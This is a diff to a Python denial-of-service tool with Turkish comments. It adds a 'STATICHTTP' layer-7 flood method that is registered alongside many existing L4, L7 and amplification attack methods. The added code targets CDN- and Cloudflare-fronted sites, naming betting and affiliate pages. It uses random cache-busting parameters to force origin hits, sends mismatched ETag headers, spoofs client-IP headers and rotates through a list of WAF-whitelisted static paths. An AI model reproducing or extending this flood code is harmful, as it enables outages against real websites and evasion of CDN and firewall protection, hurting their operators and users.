@@ -13,7 +13,7 @@ Usage:
   threads  : thread sayısı
 
 L7 Methods  : GET POST HEAD PPS NULL OVH STRESS COOKIES APACHE XMLRPC
-              DYN GSB RHEX STOMP BOT SLOW AVB CFB BYPASS EVEN DOWNLOADER
+              DYN GSB RHEX STOMP BOT SLOW AVB CFB BYPASS EVEN DOWNLOADER STATICHTTP
 L4 Methods  : UDP TCP SYN ICMP CPS CONNECTION VSE TS3 MCPE FIVEM DISCORD
 AMP Methods : RDP CLDAP MEM CHAR NTP DNS ARD (root + reflectors arg gerekir)
 
@@ -454,6 +454,94 @@ def w_DOWNLOADER(t, rpc):
                     if not s.recv(1): break
             close(s)
 
+# Static resource flood — Cloudflare cache bypass + static site exhaustion
+# Hedef: CDN/CF arkasındaki statik siteler (bet perdesi, reklam, affiliate, landing)
+# Teknik: cache-busting params → CDN miss → origin'i döver
+#          + ETag mismatch → her seferinde tam cevap zorunlu
+#          + path rotation → WAF'ın statik path whitelist'ini tam kapsar
+_STATIC_PATHS = [
+    # Evrensel
+    '/favicon.ico','/robots.txt','/sitemap.xml','/sitemap_index.xml',
+    '/ads.txt','/app-ads.txt','/security.txt','/.well-known/security.txt',
+    # CSS/JS
+    '/assets/css/main.css','/assets/css/app.css','/assets/css/style.css',
+    '/assets/js/app.js','/assets/js/main.js','/assets/js/bundle.js',
+    '/static/css/style.css','/static/js/main.js','/static/js/vendor.js',
+    '/css/bootstrap.min.css','/css/style.css','/js/jquery.min.js',
+    '/js/bootstrap.min.js','/js/app.js',
+    # WP static
+    '/wp-includes/js/jquery/jquery.min.js',
+    '/wp-includes/css/dist/block-library/style.min.css',
+    '/wp-content/themes/generatepress/style.css',
+    '/wp-content/themes/astra/style.css',
+    '/wp-content/themes/hello-elementor/style.css',
+    # Bet/affiliate spesifik
+    '/live','/sports','/casino','/slots','/betting','/promotions','/bonuses',
+    '/en/sports','/tr/sports','/en/casino','/tr/casino',
+    # Image/font
+    '/images/logo.png','/images/banner.jpg','/img/bg.jpg','/img/logo.svg',
+    '/fonts/roboto.woff2','/fonts/opensans.woff2',
+    # CDN ve CF
+    '/cdn-cgi/rum','/cdn-cgi/challenge-platform/h/g/orchestrate/managed/v1',
+    '/wp-json/wp/v2/posts',
+]
+_ACCEPT_MAP = {
+    'css': 'text/css,*/*;q=0.1',
+    'js':  'application/javascript,*/*;q=0.1',
+    'png': 'image/webp,image/apng,image/*,*/*;q=0.8',
+    'jpg': 'image/webp,image/apng,image/*,*/*;q=0.8',
+    'svg': 'image/svg+xml,image/*,*/*;q=0.8',
+    'ico': 'image/x-icon,image/*,*/*;q=0.5',
+    'woff2':'font/woff2,font/*,*/*;q=0.7',
+    'woff': 'font/woff,font/*,*/*;q=0.7',
+    'xml': 'application/xml,text/xml,*/*;q=0.9',
+    'txt': 'text/plain,*/*;q=0.9',
+    'json':'application/json,*/*;q=0.9',
+}
+
+def w_STATICHTTP(t, rpc):
+    """
+    Statik içerik flood: cache-busting + ETag mismatch + path rotation.
+    CF/nginx cache'ini bypass ederek origin'e max baskı uygular.
+    Statik site + CDN korumalı bet perdesi için tasarlandı.
+    """
+    while not _stop.is_set():
+        with suppress(Exception):
+            s = t.conn()
+            for _ in range(rpc):
+                if _stop.is_set(): break
+                path = random.choice(_STATIC_PATHS)
+                ext  = path.rsplit('.', 1)[-1].lower() if '.' in path.split('/')[-1] else ''
+                acc  = _ACCEPT_MAP.get(ext, 'text/html,application/xhtml+xml,*/*;q=0.9')
+                ip   = rip()
+                # Cache buster: her istek farklı URL → CDN miss → origin vurulur
+                bust = f"?v={rstr(10)}&_={rint(100000000,999999999)}"
+                # ETag mismatch: sunucuyu tam cevap vermeye zorlar
+                etag = f'W/"{rstr(8)}-{rint(1000,9999)}"'
+                pl = (
+                    f"GET {path}{bust} HTTP/1.1\r\n"
+                    f"Host: {t.auth}\r\n"
+                    f"Accept: {acc}\r\n"
+                    f"Accept-Encoding: gzip, deflate, br\r\n"
+                    f"Accept-Language: en-US,en;q=0.9,tr;q=0.8\r\n"
+                    f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
+                    f"Pragma: no-cache\r\n"
+                    f"Connection: keep-alive\r\n"
+                    f"User-Agent: {rua()}\r\n"
+                    f"Referer: {t.scheme}://{t.host}/\r\n"
+                    f"X-Forwarded-For: {ip}\r\n"
+                    f"X-Real-IP: {ip}\r\n"
+                    f"CF-Connecting-IP: {ip}\r\n"
+                    f"If-None-Match: {etag}\r\n"
+                    f"If-Modified-Since: Mon, 01 Jan 2024 00:00:00 GMT\r\n"
+                    f"Sec-Fetch-Dest: {'style' if ext=='css' else 'script' if ext=='js' else 'image' if ext in ('png','jpg','ico','svg') else 'document'}\r\n"
+                    f"Sec-Fetch-Mode: no-cors\r\n"
+                    f"Sec-Fetch-Site: same-origin\r\n"
+                    f"\r\n"
+                ).encode()
+                if not send(s, pl): break
+            close(s)
+
 # ══════════════════════════════════════════════════════════════════════════════
 # L4 METOTLARI
 # ══════════════════════════════════════════════════════════════════════════════
@@ -622,6 +710,7 @@ L7 = {
     'XMLRPC':w_XMLRPC, 'DYN':w_DYN, 'GSB':w_GSB, 'RHEX':w_RHEX,
     'STOMP':w_STOMP, 'BOT':w_BOT, 'SLOW':w_SLOW, 'AVB':w_AVB,
     'CFB':w_CFB, 'BYPASS':w_BYPASS, 'EVEN':w_EVEN, 'DOWNLOADER':w_DOWNLOADER,
+    'STATICHTTP':w_STATICHTTP,
 }
 L4 = {
     'UDP':w_UDP, 'TCP':w_TCP, 'SYN':w_SYN, 'ICMP':w_ICMP,
